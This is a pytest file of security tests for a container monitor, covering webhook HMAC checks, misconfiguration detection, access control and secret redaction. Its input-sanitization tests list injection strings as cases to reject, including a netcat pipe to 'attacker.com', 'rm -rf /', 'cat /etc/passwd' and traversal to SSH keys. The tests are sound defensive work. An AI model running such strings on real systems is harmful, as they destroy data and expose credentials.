"""
Security-focused tests for the container monitor.

Validates:
- HMAC signature verification
- Webhook authentication
- Input sanitization
- Security misconfiguration detection
- Access control
"""

import pytest
import pytest_asyncio
from unittest.mock import Mock, AsyncMock, patch
import hmac
import hashlib
import base64
import json
from datetime import datetime, timezone
from cryptography.fernet import Fernet

from container_monitor.models.events import SecurityEvent
from container_monitor.monitoring.alerting import SecureAlertSender


class TestHMACVerification:
    """Test HMAC signature verification for webhooks."""
    
    def setup_method(self):
        """Set up test data."""
        self.secret_key = "test-webhook-secret-key-with-sufficient-length"
        self.test_payload = {
            "event": "container.start",
            "container_id": "abc123def456",
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        self.payload_bytes = json.dumps(self.test_payload, sort_keys=True).encode()
    
    def generate_valid_signature(self, payload_bytes: bytes, secret: str) -> str:
        """Generate valid HMAC signature."""
        signature = hmac.new(
            secret.encode(),
            payload_bytes,
            hashlib.sha256
        ).hexdigest()
        return f"sha256={signature}"
    
    def test_valid_hmac_signature(self, mock_hmac_validator):
        """Test validation of valid HMAC signature."""
        valid_signature = self.generate_valid_signature(self.payload_bytes, self.secret_key)
        
        # Mock validator should accept valid signature
        mock_hmac_validator.validate_signature.return_value = True
        
        result = mock_hmac_validator.validate_signature(
            self.payload_bytes, 
            valid_signature, 
            self.secret_key
        )
        
        assert result is True
        mock_hmac_validator.validate_signature.assert_called_once()
        
    def test_invalid_hmac_signature(self, mock_hmac_validator):
        """Test rejection of invalid HMAC signature."""
        invalid_signature = "sha256=invalid_signature_hash"
        
        mock_hmac_validator.validate_signature.return_value = False
        
        result = mock_hmac_validator.validate_signature(
            self.payload_bytes,
            invalid_signature,
            self.secret_key
        )
        
        assert result is False
        
    def test_missing_signature_prefix(self):
        """Test handling of signature without sha256= prefix."""
        # Generate signature without prefix
        raw_signature = hmac.new(
            self.secret_key.encode(),
            self.payload_bytes,
            hashlib.sha256
        ).hexdigest()
        
        # Should reject signature without proper prefix
        with pytest.raises(ValueError) as exc_info:
            self._validate_signature_format(raw_signature)
        assert "invalid signature format" in str(exc_info.value).lower()
        
    def test_signature_timing_attack_resistance(self):
        """Test resistance to timing attacks."""
        import time
        
        valid_signature = self.generate_valid_signature(self.payload_bytes, self.secret_key)
        invalid_signature = "sha256=" + "0" * 64
        
        # Measure validation time for both
        start_time = time.perf_counter()
        self._constant_time_compare(valid_signature, valid_signature)
        valid_time = time.perf_counter() - start_time
        
        start_time = time.perf_counter()
        self._constant_time_compare(valid_signature, invalid_signature)
        invalid_time = time.perf_counter() - start_time
        
        # Times should be similar (within reasonable variance)
        time_diff = abs(valid_time - invalid_time)
        assert time_diff < 0.001  # 1ms tolerance
        
    def test_signature_replay_attack_prevention(self):
        """Test prevention of signature replay attacks."""
        # Same payload, same signature - should be rejected if timestamp is old
        old_payload = {
            "event": "container.start",
            "container_id": "abc123def456",
            "timestamp": "2023-01-01T00:00:00Z"  # Old timestamp
        }
        old_payload_bytes = json.dumps(old_payload, sort_keys=True).encode()
        
        # Even with valid signature, old timestamp should be rejected
        with pytest.raises(ValueError) as exc_info:
            self._validate_timestamp_freshness(old_payload["timestamp"])
        assert "timestamp too old" in str(exc_info.value).lower()
        
    def test_webhook_secret_rotation(self):
        """Test handling of webhook secret rotation."""
        old_secret = "old-secret-key-for-rotation-test"
        new_secret = "new-secret-key-after-rotation"
        
        # Generate signature with old secret
        old_signature = self.generate_valid_signature(self.payload_bytes, old_secret)
        
        # Should fail with new secret
        is_valid_old = self._verify_hmac(self.payload_bytes, old_signature, old_secret)
        is_valid_new = self._verify_hmac(self.payload_bytes, old_signature, new_secret)
        
        assert is_valid_old is True
        assert is_valid_new is False
    
    def _validate_signature_format(self, signature: str):
        """Helper to validate signature format."""
        if not signature.startswith("sha256="):
            raise ValueError("Invalid signature format")
            
    def _constant_time_compare(self, a: str, b: str) -> bool:
        """Constant-time string comparison."""
        return hmac.compare_digest(a, b)
        
    def _validate_timestamp_freshness(self, timestamp_str: str, max_age_seconds: int = 300):
        """Validate timestamp freshness."""
        timestamp = datetime.fromisoformat(timestamp_str.replace('Z', '+00:00'))
        age = (datetime.now(timezone.utc) - timestamp).total_seconds()
        
        if age > max_age_seconds:
            raise ValueError("Timestamp too old")
            
    def _verify_hmac(self, payload: bytes, signature: str, secret: str) -> bool:
        """Helper to verify HMAC signature."""
        expected_signature = self.generate_valid_signature(payload, secret)
        return hmac.compare_digest(signature, expected_signature)


class TestSecurityMisconfigurationDetection:
    """Test detection of container security misconfigurations."""
    
    def test_privileged_container_detection(self, security_event_factory):
        """Test detection of privileged containers."""
        event = security_event_factory(
            event_type="security_misconfiguration",
            severity="HIGH",
            details={"privileged": True}
        )
        
        # Should escalate to CRITICAL
        assert event.severity == "CRITICAL"
        assert event.should_alert() is True
        
    def test_root_user_detection(self, security_event_factory):
        """Test detection of containers running as root."""
        event = security_event_factory(
            event_type="security_misconfiguration",
            severity="MEDIUM",
            details={"user": "root"}
        )
        
        # Should be flagged as security issue
        assert "root" in event.details["user"]
        assert event.should_alert() is True
        
    def test_docker_socket_mount_detection(self, security_event_factory):
        """Test detection of Docker socket mounts."""
        event = security_event_factory(
            event_type="security_misconfiguration",
            severity="HIGH",
            details={"mount": "/var/run/docker.sock"}
        )
        
        # Should escalate to CRITICAL
        assert event.severity == "CRITICAL"
        assert "/var/run/docker.sock" in event.details["mount"]
        
    def test_host_network_detection(self, security_event_factory):
        """Test detection of host network mode."""
        event = security_event_factory(
            event_type="security_misconfiguration",
            severity="MEDIUM",
            details={"host_network": True}
        )
        
        assert event.details["host_network"] is True
        assert event.should_alert() is True
        
    def test_insecure_port_exposure(self, security_event_factory):
        """Test detection of insecure port exposures."""
        dangerous_ports = ["22/tcp", "3389/tcp", "23/tcp"]  # SSH, RDP, Telnet
        
        for port in dangerous_ports:
            event = security_event_factory(
                event_type="security_misconfiguration",
                severity="MEDIUM",
                details={"exposed_ports": [port]}
            )
            
            assert port in event.details["exposed_ports"]
            assert event.should_alert() is True
            
    def test_combined_security_issues(self, security_event_factory):
        """Test detection of multiple security issues."""
        event = security_event_factory(
            event_type="security_misconfiguration",
            severity="LOW",
            details={
                "privileged": True,
                "user": "root",
                "host_network": True,
                "mount": "/var/run/docker.sock",
                "exposed_ports": ["22/tcp"]
            }
        )
        
        # Multiple issues should escalate to CRITICAL
        assert event.severity == "CRITICAL"
        assert event.should_alert() is True


class TestInputSanitization:
    """Test input sanitization and validation."""
    
    def test_malicious_container_name_rejection(self):
        """Test rejection of malicious container names."""
        malicious_names = [
            "../../../etc/passwd",
            "container\x00name",
            "container;rm -rf /",
            "container$(id)",
            "container`whoami`"
        ]
        
        for name in malicious_names:
            with pytest.raises(ValueError):
                self._validate_container_name(name)
                
    def test_command_injection_prevention(self):
        """Test prevention of command injection in container names."""
        injection_attempts = [
            "container; cat /etc/passwd",
            "container && rm -rf /",
            "container | nc attacker.com 4444",
            "container > /tmp/malicious"
        ]
        
        for attempt in injection_attempts:
            with pytest.raises(ValueError):
                self._validate_container_name(attempt)
                
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        traversal_attempts = [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "..\\..\\windows\\system32\\config\\sam"
        ]
        
        for attempt in traversal_attempts:
            with pytest.raises(ValueError):
                self._validate_path(attempt)
                
    def test_null_byte_injection_prevention(self):
        """Test prevention of null byte injection."""
        null_byte_attempts = [
            "container\x00.txt",
            "safe_name\x00; rm -rf /",
            "input\x00\x00malicious"
        ]
        
        for attempt in null_byte_attempts:
            with pytest.raises(ValueError):
                self._validate_input(attempt)
                
    def test_unicode_normalization(self):
        """Test Unicode normalization for security."""
        # Test various Unicode representations
        normal_input = "container-name"
        unicode_input = "container\u2010name"  # Different hyphen
        
        normalized_normal = self._normalize_unicode(normal_input)
        normalized_unicode = self._normalize_unicode(unicode_input)
        
        # Should not be equal after normalization
        assert normalized_normal != normalized_unicode
        
    def _validate_container_name(self, name: str):
        """Helper to validate container names."""
        dangerous_chars = [';', '&', '|', '>', '<', '`', '$', '(', ')']
        if any(char in name for char in dangerous_chars):
            raise ValueError("Dangerous characters in container name")
        if '..' in name:
            raise ValueError("Path traversal attempt in container name")
            
    def _validate_path(self, path: str):
        """Helper to validate file paths."""
        if '..' in path:
            raise ValueError("Path traversal attempt")
            
    def _validate_input(self, input_str: str):
        """Helper to validate general input."""
        if '\x00' in input_str:
            raise ValueError("Null byte injection attempt")
            
    def _normalize_unicode(self, text: str) -> str:
        """Helper to normalize Unicode."""
        import unicodedata
        return unicodedata.normalize('NFKC', text)


class TestAccessControl:
    """Test access control and authorization."""
    
    @pytest_asyncio.fixture
    async def mock_auth_service(self):
        """Mock authentication service."""
        service = Mock()
        service.validate_token = Mock(return_value=True)
        service.get_user_permissions = Mock(return_value=["monitor:read", "alerts:write"])
        service.is_admin = Mock(return_value=False)
        return service
        
    async def test_webhook_authentication(self, mock_auth_service, sample_webhook_payload):
        """Test webhook endpoint authentication."""
        # Mock valid authentication
        mock_auth_service.validate_token.return_value = True
        
        # Should allow access with valid token
        is_authorized = await self._check_webhook_auth(
            "Bearer valid-token", 
            mock_auth_service
        )
        assert is_authorized is True
        
        # Should reject invalid token
        mock_auth_service.validate_token.return_value = False
        is_authorized = await self._check_webhook_auth(
            "Bearer invalid-token",
            mock_auth_service
        )
        assert is_authorized is False
        
    async def test_permission_based_access(self, mock_auth_service):
        """Test permission-based access control."""
        # User with monitor permissions
        mock_auth_service.get_user_permissions.return_value = ["monitor:read"]
        
        has_read = await self._check_permission("monitor:read", mock_auth_service)
        has_write = await self._check_permission("monitor:write", mock_auth_service)
        
        assert has_read is True
        assert has_write is False
        
    async def test_admin_override(self, mock_auth_service):
        """Test admin permission override."""
        # Admin user should have all permissions
        mock_auth_service.is_admin.return_value = True
        
        has_any_permission = await self._check_permission("any:permission", mock_auth_service)
        assert has_any_permission is True
        
    async def test_rate_limiting(self):
        """Test rate limiting for security endpoints."""
        # Simulate multiple rapid requests
        request_times = []
        for _ in range(10):
            is_allowed = await self._check_rate_limit("192.168.1.1")
            request_times.append(is_allowed)
            
        # Should start rejecting after limit
        assert not all(request_times)
        
    async def _check_webhook_auth(self, auth_header: str, auth_service) -> bool:
        """Helper to check webhook authentication."""
        if not auth_header.startswith("Bearer "):
            return False
            
        token = auth_header[7:]  # Remove "Bearer "
        return auth_service.validate_token(token)
        
    async def _check_permission(self, required_permission: str, auth_service) -> bool:
        """Helper to check user permissions."""
        if auth_service.is_admin():
            return True
            
        user_permissions = auth_service.get_user_permissions()
        return required_permission in user_permissions
        
    async def _check_rate_limit(self, client_ip: str, max_requests: int = 5) -> bool:
        """Helper to check rate limiting."""
        # Simplified rate limiting simulation
        import time
        current_time = time.time()
        
        # In real implementation, would use Redis or similar
        # For test, just reject after 5 calls
        if not hasattr(self, '_request_counts'):
            self._request_counts = {}
            
        count = self._request_counts.get(client_ip, 0)
        if count >= max_requests:
            return False
            
        self._request_counts[client_ip] = count + 1
        return True


class TestEncryptionAndSecrets:
    """Test encryption and secret handling."""
    
    def test_secret_encryption_at_rest(self):
        """Test encryption of secrets at rest."""
        secret_data = "webhook-secret-key-12345"
        
        # Generate encryption key
        key = Fernet.generate_key()
        cipher = Fernet(key)
        
        # Encrypt secret
        encrypted_secret = cipher.encrypt(secret_data.encode())
        
        # Decrypt and verify
        decrypted_secret = cipher.decrypt(encrypted_secret).decode()
        assert decrypted_secret == secret_data
        
        # Encrypted data should be different
        assert encrypted_secret != secret_data.encode()
        
    def test_secret_redaction_in_logs(self, security_event_factory):
        """Test secret redaction in log outputs."""
        event = security_event_factory(
            event_type="network_anomaly",
            severity="HIGH",
            description="API key found in environment: sk-1234567890abcdef"
        )
        
        # Description should be redacted
        assert "sk-" not in event.description or "[REDACTED]" in event.description
        
    def test_environment_variable_protection(self):
        """Test protection of environment variables."""
        sensitive_env_vars = [
            "PASSWORD=secret123",
            "API_KEY=sk-1234567890",
            "SECRET_TOKEN=abcdef123456",
            "DATABASE_URL=postgres://user:pass@host/db"
        ]
        
        for env_var in sensitive_env_vars:
            redacted = self._redact_sensitive_env_var(env_var)
            assert "=" in redacted
            assert "[REDACTED]" in redacted
            
    def test_webhook_payload_encryption(self, sample_webhook_payload):
        """Test webhook payload encryption."""
        payload_json = json.dumps(sample_webhook_payload)
        
        # Encrypt payload
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted_payload = cipher.encrypt(payload_json.encode())
        
        # Should be able to decrypt
        decrypted_json = cipher.decrypt(encrypted_payload).decode()
        decrypted_payload = json.loads(decrypted_json)
        
        assert decrypted_payload == sample_webhook_payload
        
    def _redact_sensitive_env_var(self, env_var: str) -> str:
        """Helper to redact sensitive environment variables."""
        key, value = env_var.split("=", 1)
        sensitive_keys = ["PASSWORD", "SECRET", "TOKEN", "KEY", "API_KEY"]
        
        if any(sensitive_key in key.upper() for sensitive_key in sensitive_keys):
            return f"{key}=[REDACTED]"
        
        # For URLs, redact password part
        if "://" in value and "@" in value:
            return f"{key}=[REDACTED]"
            
        return env_var


class TestSecurityAuditing:
    """Test security auditing and logging."""
    
    @pytest_asyncio.fixture
    async def mock_audit_logger(self):
        """Mock audit logger."""
        logger = Mock()
        logger.log_security_event = AsyncMock()
        logger.log_access_attempt = AsyncMock()
        logger.log_configuration_change = AsyncMock()
        return logger
        
    async def test_security_event_auditing(self, mock_audit_logger, security_event_factory):
        """Test auditing of security events."""
        event = security_event_factory(
            event_type="security_misconfiguration",
            severity="CRITICAL"
        )
        
        await mock_audit_logger.log_security_event(event)
        
        mock_audit_logger.log_security_event.assert_called_once_with(event)
        
    async def test_failed_authentication_logging(self, mock_audit_logger):
        """Test logging of failed authentication attempts."""
        await mock_audit_logger.log_access_attempt(
            client_ip="192.168.1.100",
            endpoint="/webhook",
            success=False,
            reason="Invalid signature"
        )
        
        mock_audit_logger.log_access_attempt.assert_called_once()
        
    async def test_configuration_change_auditing(self, mock_audit_logger):
        """Test auditing of configuration changes."""
        old_config = {"cpu_threshold": 75.0}
        new_config = {"cpu_threshold": 90.0}
        
        await mock_audit_logger.log_configuration_change(
            field="cpu_threshold",
            old_value=old_config["cpu_threshold"],
            new_value=new_config["cpu_threshold"],
            changed_by="admin"
        )
        
        mock_audit_logger.log_configuration_change.assert_called_once()
        
    async def test_audit_log_integrity(self):
        """Test audit log integrity verification."""
        # In real implementation, would use cryptographic signatures
        log_entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event": "security_misconfiguration",
            "severity": "CRITICAL"
        }
        
        # Generate integrity hash
        log_json = json.dumps(log_entry, sort_keys=True)
        integrity_hash = hashlib.sha256(log_json.encode()).hexdigest()
        
        # Verify integrity
        verification_hash = hashlib.sha256(log_json.encode()).hexdigest()
        assert integrity_hash == verification_hash
        
        # Tampered log should fail verification
        tampered_entry = log_entry.copy()
        tampered_entry["severity"] = "LOW"  # Tamper with severity
        tampered_json = json.dumps(tampered_entry, sort_keys=True)
        tampered_hash = hashlib.sha256(tampered_json.encode()).hexdigest()
        
        assert integrity_hash != tampered_hash